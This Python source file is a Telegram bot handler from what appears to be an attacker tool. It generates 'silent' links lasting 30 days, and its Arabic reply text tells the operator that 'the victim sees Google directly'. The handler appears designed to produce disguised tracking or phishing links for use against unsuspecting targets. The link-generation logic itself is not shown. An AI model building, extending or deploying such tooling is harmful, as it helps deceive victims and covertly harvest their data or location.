# bot_handlers/steps/silent_steps.py
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import bot
from imports_manager import generate_silent_link
from logging_config import get_logger

from ..helpers import h

logger = get_logger("bot_handlers.steps.silent")


def silent_label_handler(message):
    chat_id = message.chat.id
    if not message.text:
        bot.send_message(chat_id, "❌ اسم غير صحيح")
        return

    label = message.text.strip()[:50]

    try:
        link = generate_silent_link(chat_id, label)
        if not link:
            bot.send_message(chat_id, "❌ فشل توليد الرابط، حاول مرة أخرى")
            return

        text = (
            f"✅ <b>الرابط جاهز!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🏷️ <b>الاسم:</b> <code>{h(label)}</code>\n"
            f"⏰ <b>الصلاحية:</b> 30 يوم\n\n"
            f"🎯 <b>الرابط:</b>\n"
            f"<code>{h(link)}</code>\n\n"
            f"💡 <i>الضحية تشوف Google مباشرة!</i>"
        )

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🎯 لوحة Silent", callback_data="gen_silent"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))

        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)

    except Exception as e:
        logger.exception(f"silent_label_handler error: {e}")
        bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")
